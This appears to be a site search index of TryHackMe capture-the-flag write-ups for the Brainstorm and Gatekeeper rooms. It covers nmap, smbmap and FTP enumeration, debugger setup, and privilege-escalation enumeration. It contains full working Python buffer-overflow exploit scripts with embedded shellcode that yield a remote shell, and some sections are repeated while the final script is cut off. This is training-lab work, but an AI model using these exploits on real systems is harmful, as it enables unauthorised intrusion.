missed.","title":"Scan"},{"location":"TryHackMe/Brainstorm/#explore-the-services","text":"","title":"Explore the services"},{"location":"TryHackMe/Brainstorm/#ftp","text":"Anonymous login is allowed. I logged in with user ftp and pass ftp but kept hitting an error about Extended Passive Mode. . I did some reasearch to refresh my memory on what this was. ftp 10.10.109.7 Connected to 10.10.109.7. 220 Microsoft FTP Service Name (10.10.109.7:nate): ftp 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp> ls 229 Entering Extended Passive Mode (|||49356|) Long story short, you need to force active mode since passive mode is failing. I spent a lot of time googling this error and reading about how to fix it. But the answer was right in the damn man page; need to force active mode with the -A flag. ftp 10.10.109.7 -A Connected to 10.10.109.7. 220 Microsoft FTP Service Name (10.10.109.7:nate): ftp 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp> ls 200 EPRT command successful. 150 Opening ASCII mode data connection. 08-29-19 07:36PM <DIR> chatserver 226 Transfer complete. Great, it's working now and I see a folder. ftp> cd chatserver 250 CWD command successful. ftp> ls 200 EPRT command successful. 150 Opening ASCII mode data connection. 08-29-19 09:26PM 43747 chatserver.exe 08-29-19 09:27PM 30761 essfunc.dll 226 Transfer complete. Find chatserver.exe and download it for later. ftp> get chatserver.exe local: chatserver.exe remote: chatserver.exe 200 EPRT command successful. 150 Opening ASCII mode data connection. 100% |******************************************************************| 43747 43.33 KiB/s 00:00 ETA 226 Transfer complete. WARNING! 45 bare linefeeds received in ASCII mode. File may not have transferred correctly. 43747 bytes received in 00:00 (43.31 KiB/s) Crap, I've ran into this before. Need to use binary to transfer executables. ftp> binary 200 Type set to I. ftp> get chatserver.exe local: chatserver.exe remote: chatserver.exe 200 EPRT command successful. 125 Data connection already open; Transfer starting. 100% |******************************************************************| 43747 43.87 KiB/s 00:00 ETA 226 Transfer complete.","title":"FTP"},{"location":"TryHackMe/Brainstorm/#exploit-development","text":"","title":"Exploit Development"},{"location":"TryHackMe/Brainstorm/#setting-up-the-dev-environment","text":"","title":"Setting up the Dev environment"},{"location":"TryHackMe/Brainstorm/#setting-up-the-sandbox","text":"Now I'll set up a Windows Dev environment in Windows Sandbox (I don't want to run this executable on my PC.) It appears to be working. Will not have to to do anything crafty with the network.","title":"Setting up the sandbox"},{"location":"TryHackMe/Brainstorm/#immunity-and-python","text":"Then install immunity, which also installs python. The python installer failed the first time around so I selected \"Install just for this user\" the second time around. Not sure if it was coincidence or lucky guess but it worked. Lets get crackin! Actually immunity wouldn't boot as it coulnd't find the python files. So I'm moving this project to a dev version of Windows 11 I have installed in the lab. It'll be a good first look at Windows 11 anyways. EDIT: Turns out it had nothing to do with the sandbox. It's possible this would have worked if I did all the below fixes, but everything is lost from a sandbox when the session is closed. It's probably better to use a VM anyways so I can maintain the debugging environment. I was able to get everything working in Windows 11. Had to configure Windows firewall to allow port 9999 though. Everything is working! Seems like the overflow will be in the username. Lets fire up the tool.","title":"Immunity and python"},{"location":"TryHackMe/Brainstorm/#mona","text":"Looks like I spoke too soon about everything working. I got an error when trying to run a !mona command. pycommands: error importing module I see online this error is from using the 64-bit python and using a 32bit version should fix it. So...reinstall python with x86 version. Also, I need to install mona . Wow, setting up this environment is a PITA - it was nice having a box ready on TryHackMe for the other challenges. I'll have to save this setup. Another issue - since the file was downloaded from the internet, it has to be marked as safe in the file properties before it can be used. Another issue I ran into was the mona.py file was full of HTML as I downloaded it incorrectly. Found that here on github","title":"Mona"},{"location":"TryHackMe/Brainstorm/#i-never-want-to-go-through-this-again","text":"IT WORKS!!!! Getting a snapshot...","title":"I never want to go through this again"},{"location":"TryHackMe/Brainstorm/#develop-the-exploit","text":"I used the buffer overflow helper script I made and got this box done MUCH quicker than I was able to get the DEV environment set up. I never turned off Windows AV module so I only had access for a bit before getting kicked. The completed POC exploit is as follows: #!/usr/bin/env python3 import socket ip = \"192.168.1.104\" port = 9999 prefix = \" \" offset = 6107 overflow = \"A\" * offset retn = \"\\xdf\\x14\\x50\\x62\" padding = \"\\x90\" * 16 payload = \"\\xbd\\xcf\\xbb\\xca\\x95\\xdb\\xc2\\xd9\\x74\\x24\\xf4\\x58\\x33\\xc9\\xb1\\x52\\x31\\x68\\x12\\x03\\x68\\x12\\x83\\x27\\x47\\x28\\x60\\x4b\\x50\\x2f\\x8b\\xb3\\xa1\\x50\\x05\\x56\\x90\\x50\\x71\\x13\\x83\\x60\\xf1\\x71\\x28\\x0a\\x57\\x61\\xbb\\x7e\\x70\\x86\\x0c\\x34\\xa6\\xa9\\x8d\\x65\\x9a\\xa8\\x0d\\x74\\xcf\\x0a\\x2f\\xb7\\x02\\x4b\\x68\\xaa\\xef\\x19\\x21\\xa0\\x42\\x8d\\x46\\xfc\\x5e\\x26\\x14\\x10\\xe7\\xdb\\xed\\x13\\xc6\\x4a\\x65\\x4a\\xc8\\x6d\\xaa\\xe6\\x41\\x75\\xaf\\xc3\\x18\\x0e\\x1b\\xbf\\x9a\\xc6\\x55\\x40\\x30\\x27\\x5a\\xb3\\x48\\x60\\x5d\\x2c\\x3f\\x98\\x9d\\xd1\\x38\\x5f\\xdf\\x0d\\xcc\\x7b\\x47\\xc5\\x76\\xa7\\x79\\x0a\\xe0\\x2c\\x75\\xe7\\x66\\x6a\\x9a\\xf6\\xab\\x01\\xa6\\x73\\x4a\\xc5\\x2e\\xc7\\x69\\xc1\\x6b\\x93\\x10\\x50\\xd6\\x72\\x2c\\x82\\xb9\\x2b\\x88\\xc9\\x54\\x3f\\xa1\\x90\\x30\\x8c\\x88\\x2a\\xc1\\x9a\\x9b\\x59\\xf3\\x05\\x30\\xf5\\xbf\\xce\\x9e\\x02\\xbf\\xe4\\x67\\x9c\\x3e\\x07\\x98\\xb5\\x84\\x53\\xc8\\xad\\x2d\\xdc\\x83\\x2d\\xd1\\x09\\x03\\x7d\\x7d\\xe2\\xe4\\x2d\\x3d\\x52\\x8d\\x27\\xb2\\x8d\\xad\\x48\\x18\\xa6\\x44\\xb3\\xcb\\x09\\x30\\xba\\x7b\\xe2\\x43\\xbc\\x6a\\xae\\xca\\x5a\\xe6\\x5e\\x9b\\xf5\\x9f\\xc7\\x86\\x8d\\x3e\\x07\\x1d\\xe8\\x01\\x83\\x92\\x0d\\xcf\\x64\\xde\\x1d\\xb8\\x84\\x95\\x7f\\x6f\\x9a\\x03\\x17\\xf3\\x09\\xc8\\xe7\\x7a\\x32\\x47\\xb0\\x2b\\x84\\x9e\\x54\\xc6\\xbf\\x08\\x4a\\x1b\\x59\\x72\\xce\\xc0\\x9a\\x7d\\xcf\\x85\\xa7\\x59\\xdf\\x53\\x27\\xe6\\x8b\\x0b\\x7e\\xb0\\x65\\xea\\x28\\x72\\xdf\\xa4\\x87\\xdc\\xb7\\x31\\xe4\\xde\\xc1\\x3d\\x21\\xa9\\x2d\\x8f\\x9c\\xec\\x52\\x20\\x49\\xf9\\x2b\\x5c\\xe9\\x06\\xe6\\xe4\\x09\\xe5\\x22\\x11\\xa2\\xb0\\xa7\\x98\\xaf\\x42\\x12\\xde\\xc9\\xc0\\x96\\x9f\\x2d\\xd8\\xd3\\x9a\\x6a\\x5e\\x08\\xd7\\xe3\\x0b\\x2e\\x44\\x03\\x1e;\" postfix = \"\" buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil buffer...\") s.send(bytes(buffer + \"\\r\\n\", \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\")","title":"Develop the exploit"},{"location":"TryHackMe/Brainstorm/#exploit-the-target","text":"Now to swap out the payload (line 15) and the RHOST IP (line 5). Time to test the exploit. Nice, I got a system shell!","title":"Exploit the target"},{"location":"TryHackMe/BufferOverFlowPrep/","text":"BufferOverFlowPrep \u00b6 This room is a nice practice zone for buffer overflow exploit development. I've already completed the first two tasks which include launching the VM and a buffer overflow leveraging mona in immunity debugger to increase speed. I see a lot of automation potential in the exploit provided in task 2. So I will use this series to come up with a toolset to automate this crap so I never have to do it again. Initially I was going to document my journey as I developed the tool, but it was too much extra work. Here's the code . Only runs on linux and xclip required. It could easily be ported to Windows, just need to change the functions that access clipboard. LMK if you have any questions!","title":"BufferOverFlowPrep"},{"location":"TryHackMe/BufferOverFlowPrep/#bufferoverflowprep","text":"This room is a nice practice zone for buffer overflow exploit development. I've already completed the first two tasks which include launching the VM and a buffer overflow leveraging mona in immunity debugger to increase speed. I see a lot of automation potential in the exploit provided in task 2. So I will use this series to come up with a toolset to automate this crap so I never have to do it again. Initially I was going to document my journey as I developed the tool, but it was too much extra work. Here's the code . Only runs on linux and xclip required. It could easily be ported to Windows, just need to change the functions that access clipboard. LMK if you have any questions!","title":"BufferOverFlowPrep"},{"location":"TryHackMe/Gatekeeper/","text":"Gatekeeper \u00b6 Recon \u00b6 There not much for an introduction on this one. The description mentions passing through the gatekeeper and there's fire on the other side. Scanning \u00b6 NMAP \u00b6 PORT STATE SERVICE REASON VERSION 135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds syn-ack ttl 125 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 31337/tcp open Elite? syn-ack ttl 125 | fingerprint-strings: | GetRequest: | Hello GET / HTTP/1.0 |_ Hello 49152/tcp open unknown syn-ack ttl 125 49153/tcp open unknown syn-ack ttl 125 49154/tcp open unknown syn-ack ttl 125 49155/tcp open unknown syn-ack ttl 125 49161/tcp open unknown syn-ack ttl 125 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port31337-TCP:V=7.92%I=9%D=2/11%Time=62072C3C%P=x86_64-pc-linux-gnu%r(G SF:etRequest,24,\"Hello\\x20GET\\x20/\\x20HTTP/1\\.0\\r!!!\\nHello\\x20\\r!!!\\n\"); OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (95%), Microsoft Windows 7 SP1 (95%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (94%) SMBmap \u00b6 [+] Guest session IP: 10.10.79.126:139 Name: 10.10.79.126 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESSRemote Admin C$ NO ACCESSDefault share IPC$ NO ACCESSRemote IPC Users READ ONLY .\\Users\\* dw--w--w-- 0 Thu May 14 20:57:08 2020 . dw--w--w-- 0 Thu May 14 20:57:08 2020 .. dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Default fr--r--r-- 174 Tue Apr 21 22:18:13 2020 desktop.ini dr--r--r-- 0 Thu May 14 20:58:07 2020 Share .\\Users\\Default\\* dw--w--w-- 0 Sun Apr 19 14:51:00 2020 . dw--w--w-- 0 Sun Apr 19 14:51:00 2020 .. dr--r--r-- 0 Sun Apr 19 14:51:00 2020 AppData dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Desktop dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Documents dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Downloads dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Favorites dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Links dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Music fr--r--r-- 262144 Tue Apr 21 22:18:13 2020 NTUSER.DAT fr--r--r-- 1024 Tue Apr 21 22:18:13 2020 NTUSER.DAT.LOG fr--r--r-- 189440 Tue Apr 21 22:18:13 2020 NTUSER.DAT.LOG1 fr--r--r-- 0 Tue Apr 21 22:18:13 2020 NTUSER.DAT.LOG2 fr--r--r-- 65536 Tue Apr 21 22:18:13 2020 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf fr--r--r-- 524288 Tue Apr 21 22:18:13 2020 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms fr--r--r-- 524288 Tue Apr 21 22:18:13 2020 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Pictures dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Saved Games dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Videos .\\Users\\Default\\AppData\\* dr--r--r-- 0 Sun Apr 19 14:51:00 2020 . dr--r--r-- 0 Sun Apr 19 14:51:00 2020 .. dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Local dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Roaming .\\Users\\Default\\AppData\\Local\\* dr--r--r-- 0 Sun Apr 19 14:51:00 2020 . dr--r--r-- 0 Sun Apr 19 14:51:00 2020 .. dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Microsoft dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Temp .\\Users\\Default\\AppData\\Local\\Microsoft\\* dr--r--r-- 0 Sun Apr 19 14:51:00 2020 . dr--r--r-- 0 Sun Apr 19 14:51:00 2020 .. dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Windows .\\Users\\Default\\AppData\\Local\\Microsoft\\Windows\\* dr--r--r-- 0 Sun Apr 19 14:51:00 2020 . dr--r--r-- 0 Sun Apr 19 14:51:00 2020 .. dr--r--r-- 0 Sun Apr 19 14:51:00 2020 GameExplorer dr--r--r-- 0 Sun Apr 19 14:51:00 2020 History dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Temporary Internet Files .\\Users\\Default\\AppData\\Roaming\\* dr--r--r-- 0 Sun Apr 19 14:51:00 2020 . dr--r--r-- 0 Sun Apr 19 14:51:00 2020 .. dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Media Center Programs dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Microsoft .\\Users\\Default\\AppData\\Roaming\\Microsoft\\* dr--r--r-- 0 Sun Apr 19 14:51:00 2020 . dr--r--r-- 0 Sun Apr 19 14:51:00 2020 .. dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Internet Explorer dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Windows .\\Users\\Default\\AppData\\Roaming\\Microsoft\\Internet Explorer\\* dr--r--r-- 0 Sun Apr 19 14:51:00 2020 . dr--r--r-- 0 Sun Apr 19 14:51:00 2020 .. dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Quick Launch .\\Users\\Default\\AppData\\Roaming\\Microsoft\\Windows\\* dr--r--r-- 0 Sun Apr 19 14:51:00 2020 . dr--r--r-- 0 Sun Apr 19 14:51:00 2020 .. dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Cookies dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Network Shortcuts dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Printer Shortcuts dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Recent dw--w--w-- 0 Sun Apr 19 14:51:00 2020 SendTo dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Start Menu dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Templates .\\Users\\Share\\* dr--r--r-- 0 Thu May 14 20:58:07 2020 . dr--r--r-- 0 Thu May 14 20:58:07 2020 .. fr--r--r-- 13312 Thu May 14 20:58:07 2020 gatekeeper.exe It looks like we found the gatekeeper. Guess I'll get to use the Windows 11 dev box again. Exploit development \u00b6 I moved the file over to my dev box and fired it up in the debugger. Exploit development went well. No suprises and the script made everything easy. Here's the completed POC #!/usr/bin/env python3 import socket ip = \"192.168.1.104\" port = 31337 prefix = \" \" offset = 145 overflow = \"A\" * offset retn = \"\\xc3\\x14\\x04\\x08\" padding = \"\\x90\" * 16 payload = \"\\xba\\x43\\xa3\\x7c\\x5b\\xdb\\xd3\\xd9\\x74\\x24\\xf4\\x5e\\x2b\\xc9\\xb1\\x52\\x31\\x56\\x12\\x83\\xc6\\x04\\x03\\x15\\xad\\x9e\\xae\\x65\\x59\\xdc\\x51\\x95\\x9a\\x81\\xd8\\x70\\xab\\x81\\xbf\\xf1\\x9c\\x31\\xcb\\x57\\x11\\xb9\\x99\\x43\\xa2\\xcf\\x35\\x64\\x03\\x65\\x60\\x4b\\x94\\xd6\\x50\\xca\\x16\\x25\\x85\\x2c\\x26\\xe6\\xd8\\x2d\\x6f\\x1b\\x10\\x7f\\x38\\x57\\x87\\x6f\\x4d\\x2d\\x14\\x04\\x1d\\xa3\\x1c\\xf9\\xd6\\xc2\\x0d\\xac\\x6d\\x9d\\x8d\\x4f\\xa1\\x95\\x87\\x57\\xa6\\x90\\x5e\\xec\\x1c\\x6e\\x61\\x24\\x6d\\x8f\\xce\\x09\\x41\\x62\\x0e\\x4e\\x66\\x9d\\x65\\xa6\\x94\\x20\\x7e\\x7d\\xe6\\xfe\\x0b\\x65\\x40\\x74\\xab\\x41\\x70\\x59\\x2a\\x02\\x7e\\x16\\x38\\x4c\\x63\\xa9\\xed\\xe7\\x9f\\x22\\x10\\x27\\x16\\x70\\x37\\xe3\\x72\\x22\\x56\\xb2\\xde\\x85\\x67\\xa4\\x80\\x7a\\xc2\\xaf\\x2d\\x6e\\x7f\\xf2\\x39\\x43\\xb2\\x0c\\xba\\xcb\\xc5\\x7f\\x88\\x54\\x7e\\x17\\xa0\\x1d\\x58\\xe0\\xc7\\x37\\x1c\\x7e\\x36\\xb8\\x5d\\x57\\xfd\\xec\\x0d\\xcf\\xd4\\x8c\\xc5\\x0f\\xd8\\x58\\x49\\x5f\\x76\\x33\\x2a\\x0f\\x36\\xe3\\xc2\\x45\\xb9\\xdc\\xf3\\x66\\x13\\x75\\x99\\x9d\\xf4\\xba\\xf6\\x9c\\x74\\x53\\x05\\x9e\\x65\\xff\\x80\\x78\\xef\\xef\\xc4\\xd3\\x98\\x96\\x4c\\xaf\\x39\\x56\\x5b\\xca\\x7a\\xdc\\x68\\x2b\\x34\\x15\\x04\\x3f\\xa1\\xd5\\x53\\x1d\\x64\\xe9\\x49\\x09\\xea\\x78\\x16\\xc9\\x65\\x61\\x81\\x9e\\x22\\x57\\xd8\\x4a\\xdf\\xce\\x72\\x68\\x22\\x96\\xbd\\x28\\xf9\\x6b\\x43\\xb1\\x8c\\xd0\\x67\\xa1\\x48\\xd8\\x23\\x95\\x04\\x8f\\xfd\\x43\\xe3\\x79\\x4c\\x3d\\xbd\\xd6\\x06\\xa9\\x38\\x15\\x99\\xaf\\x44\\x70\\x6f\\x4f\\xf4\\x2d\\x36\\x70\\x39\\xba\\xbe\\x09\\x27\\x5a\\x40\\xc0\\xe3\\x7a\\xa3\\xc0\\x19\\x13\\x7a\\x81\\xa3\\x7e\\x7d\\x7c\\xe7\\x86\\xfe\\x74\\x98\\x7c\\x1e\\xfd\\x9d\\x39\\x98\\xee\\xef\\x52\\x4d\\x10\\x43\\x52\\x44;\" postfix = \"\" buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil buffer...\") s.send(bytes(buffer + \"\\r\\n\", \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\") Exploit \u00b6 I created a new payload and adjusted the POC to match the actual target and it worked! I got a shell as the user natbat . No special privileges. This is a pretty old version of windows, I could probably find a privesc vulnerability relatively easy. Privilege Escalation \u00b6 Windows Exploit Suggester \u00b6 I exfiltrated a copy of systeminfo and passed it to windows-exploit-suggester.py Then I used some grep magic to search for privesc. cat exploitSuggester | grep Priv | grep -E \"^MS..-...\" MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important WinPEAS \u00b6 I used WinPEAS.bat to enumerate from the inside. I keep seeing references to firefox on the target. WinPEAS also didn't see patches for many vulnerabilities on this machine. The smb Users share is at C:\\Users\\ Hostname: Gatekeeper The Firewall is up and running a Standard profile. Allowed programs configuration for Standard profile: Mode Traffic direction Name / Program Enable Inbound dostackbufferoverflowgood.exe / C:\\users\\mayor\\desktop\\dostackbufferoverflowgood.exe There seems to be some file dostackbufferoverflowgood.exe . I did see one internal port running... Found 2 ports that are open internally only: UDP 127.0.0.1:1900 : 2200 UDP 127.0.0.1:57514 : 2200 Couldn't set up port forwarding because I'm not admin. Beware of fire \u00b6 It's been a few days since I gained initial access to this box. I was thinking tonight about the clues on this box and was trying to figure out what this meant: there's fire on the other side. There were some ports that were only available on localhost, so in a sense that would be like a firewall. I thought this was the fire. Tonight I really wanted to dig in and see if this \"fire on the other side\" was a firewall or something else. As I was reviewing the software I remembered Firefox is instlled on this one. I remember seeing a *.lnk file right next to the user.txt. I think I brushed this off initially as a \"too-obvious\" rabbit-hole type of trap...but maybe the answer was staring me in the face the whole time.","title":"Gatekeeper"},{"location":"TryHackMe/Gatekeeper/#gatekeeper","text":"","title":"Gatekeeper"},{"location":"TryHackMe/Gatekeeper/#recon","text":"There not much for an introduction on this one. The description mentions passing through the gatekeeper and there's fire on the other side.","title":"Recon"},{"location":"TryHackMe/Gatekeeper/#scanning","text":"","title":"Scanning"},{"location":"TryHackMe/Gatekeeper/#nmap","text":"PORT STATE SERVICE REASON VERSION 135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds syn-ack ttl 125 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 31337/tcp open Elite? syn-ack ttl 125 | fingerprint-strings: | GetRequest: | Hello GET / HTTP/1.0 |_ Hello 49152/tcp open unknown syn-ack ttl 125 49153/tcp open unknown syn-ack ttl 125 49154/tcp open unknown syn-ack ttl 125 49155/tcp open unknown syn-ack ttl 125 49161/tcp open unknown syn-ack ttl 125 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port31337-TCP:V=7.92%I=9%D=2/11%Time=62072C3C%P=x86_64-pc-linux-gnu%r(G SF:etRequest,24,\"Hello\\x20GET\\x20/\\x20HTTP/1\\.0\\r!!!\\nHello\\x20\\r!!!\\n\"); OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (95%), Microsoft Windows 7 SP1 (95%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (94%)","title":"NMAP"},{"location":"TryHackMe/Gatekeeper/#smbmap","text":"[+] Guest session IP: 10.10.79.126:139 Name: 10.10.79.126 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESSRemote Admin C$ NO ACCESSDefault share IPC$ NO ACCESSRemote IPC Users READ ONLY .\\Users\\* dw--w--w-- 0 Thu May 14 20:57:08 2020 . dw--w--w-- 0 Thu May 14 20:57:08 2020 .. dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Default fr--r--r-- 174 Tue Apr 21 22:18:13 2020 desktop.ini dr--r--r-- 0 Thu May 14 20:58:07 2020 Share .\\Users\\Default\\* dw--w--w-- 0 Sun Apr 19 14:51:00 2020 . dw--w--w-- 0 Sun Apr 19 14:51:00 2020 .. dr--r--r-- 0 Sun Apr 19 14:51:00 2020 AppData dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Desktop dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Documents dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Downloads dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Favorites dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Links dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Music fr--r--r-- 262144 Tue Apr 21 22:18:13 2020 NTUSER.DAT fr--r--r-- 1024 Tue Apr 21 22:18:13 2020 NTUSER.DAT.LOG fr--r--r-- 189440 Tue Apr 21 22:18:13 2020 NTUSER.DAT.LOG1 fr--r--r-- 0 Tue Apr 21 22:18:13 2020 NTUSER.DAT.LOG2 fr--r--r-- 65536 Tue Apr 21 22:18:13 2020 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf fr--r--r-- 524288 Tue Apr 21 22:18:13 2020 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms fr--r--r-- 524288 Tue Apr 21 22:18:13 2020 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Pictures dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Saved Games dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Videos .\\Users\\Default\\AppData\\* dr--r--r-- 0 Sun Apr 19 14:51:00 2020 . dr--r--r-- 0 Sun Apr 19 14:51:00 2020 .. dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Local dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Roaming .\\Users\\Default\\AppData\\Local\\* dr--r--r-- 0 Sun Apr 19 14:51:00 2020 . dr--r--r-- 0 Sun Apr 19 14:51:00 2020 .. dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Microsoft dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Temp .\\Users\\Default\\AppData\\Local\\Microsoft\\* dr--r--r-- 0 Sun Apr 19 14:51:00 2020 . dr--r--r-- 0 Sun Apr 19 14:51:00 2020 .. dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Windows .\\Users\\Default\\AppData\\Local\\Microsoft\\Windows\\* dr--r--r-- 0 Sun Apr 19 14:51:00 2020 . dr--r--r-- 0 Sun Apr 19 14:51:00 2020 .. dr--r--r-- 0 Sun Apr 19 14:51:00 2020 GameExplorer dr--r--r-- 0 Sun Apr 19 14:51:00 2020 History dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Temporary Internet Files .\\Users\\Default\\AppData\\Roaming\\* dr--r--r-- 0 Sun Apr 19 14:51:00 2020 . dr--r--r-- 0 Sun Apr 19 14:51:00 2020 .. dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Media Center Programs dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Microsoft .\\Users\\Default\\AppData\\Roaming\\Microsoft\\* dr--r--r-- 0 Sun Apr 19 14:51:00 2020 . dr--r--r-- 0 Sun Apr 19 14:51:00 2020 .. dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Internet Explorer dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Windows .\\Users\\Default\\AppData\\Roaming\\Microsoft\\Internet Explorer\\* dr--r--r-- 0 Sun Apr 19 14:51:00 2020 . dr--r--r-- 0 Sun Apr 19 14:51:00 2020 .. dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Quick Launch .\\Users\\Default\\AppData\\Roaming\\Microsoft\\Windows\\* dr--r--r-- 0 Sun Apr 19 14:51:00 2020 . dr--r--r-- 0 Sun Apr 19 14:51:00 2020 .. dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Cookies dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Network Shortcuts dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Printer Shortcuts dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Recent dw--w--w-- 0 Sun Apr 19 14:51:00 2020 SendTo dw--w--w-- 0 Sun Apr 19 14:51:00 2020 Start Menu dr--r--r-- 0 Sun Apr 19 14:51:00 2020 Templates .\\Users\\Share\\* dr--r--r-- 0 Thu May 14 20:58:07 2020 . dr--r--r-- 0 Thu May 14 20:58:07 2020 .. fr--r--r-- 13312 Thu May 14 20:58:07 2020 gatekeeper.exe It looks like we found the gatekeeper. Guess I'll get to use the Windows 11 dev box again.","title":"SMBmap"},{"location":"TryHackMe/Gatekeeper/#exploit-development","text":"I moved the file over to my dev box and fired it up in the debugger. Exploit development went well. No suprises and the script made everything easy. Here's the completed POC #!/usr/bin/env python3 import socket ip = \"192.168.1.104\" port = 31337 prefix = \" \" offset = 145 overflow = \"A\" * offset retn = \"\\xc3\\x14\\x04\\x08\" padding = \"\\x90\" * 16 payload = 